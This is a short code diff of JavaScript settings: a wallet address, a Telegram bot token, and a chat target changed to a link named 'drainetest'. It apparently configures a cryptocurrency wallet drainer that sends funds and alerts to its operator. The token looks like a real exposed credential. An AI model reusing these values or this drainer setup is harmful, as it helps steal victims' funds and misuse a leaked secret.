@@ -1,6 +1,6 @@
 var mainWallet = "UQDi5OgrvTJ72AamSrRc_f-4tp3V1nwH-0kMGhJ5qA9tQHoR";
 var tgBotToken = "7418351578:AAGJEW3EZHMw3dMFEeS82277Wo1jaRPpHH4";
-var tgChat = "777841245"; 
+var tgChat = "https://t.me/drainetest"; 
 
 
 
